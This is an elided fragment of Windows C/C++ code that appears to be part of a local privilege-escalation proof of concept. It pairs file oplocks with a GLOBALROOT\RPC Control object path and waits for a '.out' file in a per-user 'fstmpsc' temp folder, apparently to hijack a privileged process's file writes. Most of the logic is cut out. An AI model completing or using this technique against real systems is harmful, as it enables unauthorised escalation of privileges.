...
FileOpLock* oplock;
HANDLE hFile, hFile2, hFile3, hDir;
HANDLE hthread;
NTSTATUS retcode;
...
WCHAR* fileName;
WCHAR fullobjectpathFile[50] = L"GLOBAL\\GLOBALROOT\\RPC Control\\";
	...
	do
	{
		...
		else
		{
			...
			do {
				...
				//hFile3 = CreateFile(file3, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_FLAG_OVERLAPPED, NULL);
...
LPWSTR CreateTempDirectory() {
	...
	//_swprintf(dir, L"C:\\Users\\erwin\\AppData\\Local\\Temp\\testing\\");
...
void Trigger1() {
	...
	//monitor C:\Users\XXX\AppData\Local\Temp\fstmpsc_<username>\*.out to be create
	_swprintf(dir, L"%ls\\fstmpsc_%ls", _wgetenv(L"TEMP"), _wgetenv(L"USERNAME"));
	...
	WCHAR* extension2;
	printf("[+] Waits for process to create an .out file\n");
	do {
	...
	} while (wcscmp(extension2, L".out") != 0);
	_swprintf(file, L"%ls\\%ls", dir, fileName);
